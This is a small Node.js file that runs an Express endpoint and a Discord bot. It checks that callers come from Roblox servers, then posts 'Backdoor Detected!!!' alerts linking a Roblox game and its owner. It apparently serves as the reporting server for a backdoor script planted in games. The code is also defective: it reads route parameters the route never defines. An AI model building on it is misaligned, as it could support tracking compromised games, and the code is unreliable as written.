const discord = require("discord.js");
const express = require("express");
const roip = require("./roip");

// Config
const TOKEN = ""
const Guild = ""
const ChannelId = ""

const app = express();
const client = new discord.Client();

client.once('ready', () => {
    console.log('Ready!');
});

app.use(express.json());

app.get("/api/v1/", (req, res) => { 
    // Get ip
    var ip = req.headers["cf-connecting-ip"] || req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    if (ip) {
        ip = ip.split(",");
        ip = ip[0];
    }
    roip.check(ip)
    .then(() => {
        res.json({ status: 200, message: "OK" })
        const embed = new discord.MessageEmbed()
            .setTitle("Backdoor Detected!!!")
            .addField("Game Link", `https://www.roblox.com/games/${req.params.id}`)
            .addField("Game Owner", `https://www.roblox.com/users/${req.params.id2}`)
        client.guilds.cache.get(Guild).channels.cache.get(ChannelId).send(embed);

    })
    .catch(err => {
        res.json({ status: 404, message: err })
    })
})

app.listen(8080)
client.login(TOKEN)
console.log("RBR | Listening to http://localhost:8080/api/v1")